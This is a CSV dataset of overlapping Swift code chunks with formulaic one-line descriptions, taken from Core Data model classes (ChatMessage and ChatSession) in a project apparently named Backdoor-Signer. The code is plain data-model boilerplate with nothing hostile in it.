id,language,folder,code_type,file_path,nl,code
0,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","class ChatMessage - implements functionality related to chat message","public class ChatMessage: NSManagedObject {
@NSManaged public var messageID: String?
@NSManaged public var sender: String?
@NSManaged public var content: String?
@NSManaged public var timestamp: Date?
@NSManaged public var session: ChatSession?

@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {"
1,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","class func - implements func functionality","@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {
return NSFetchRequest<ChatMessage>(entityName: ""ChatMessage"")
}
}

public extension ChatMessage {"
2,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift","extension ChatMessage - implements functionality related to chat message","public extension ChatMessage {
@objc var wrappedSender: String {"
3,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","class ChatSession - implements functionality related to chat session","public class ChatSession: NSManagedObject {
@NSManaged public var sessionID: String?
@NSManaged public var title: String?
@NSManaged public var creationDate: Date?
@NSManaged public var messages: NSSet?

@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {"
4,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","class func - implements func functionality","@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {
return NSFetchRequest<ChatSession>(entityName: ""ChatSession"")
}

// Relationship management methods
@objc(addMessagesObject:)
@NSManaged public func addToMessages(_ value: ChatMessage)

@objc(removeMessagesObject:)
@NSManaged public func removeFromMessages(_ value: ChatMessage)"
5,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function addToMessages - implements addtomessages functionality","@NSManaged public func addToMessages(_ value: ChatMessage)

@objc(removeMessagesObject:)
@NSManaged public func removeFromMessages(_ value: ChatMessage)

@objc(addMessages:)
@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
6,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function removeFromMessages - implements removefrommessages functionality","@NSManaged public func removeFromMessages(_ value: ChatMessage)

@objc(addMessages:)
@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
7,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function addToMessages - implements addtomessages functionality","@NSManaged public func addToMessages(_ values: NSSet)

@objc(removeMessages:)
@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
8,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","Function removeFromMessages - implements removefrommessages functionality","@NSManaged public func removeFromMessages(_ values: NSSet)
}

public extension ChatSession {"
9,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift","extension ChatSession - implements functionality related to chat session","public extension ChatSession {
@objc var wrappedMessages: [ChatMessage] {"
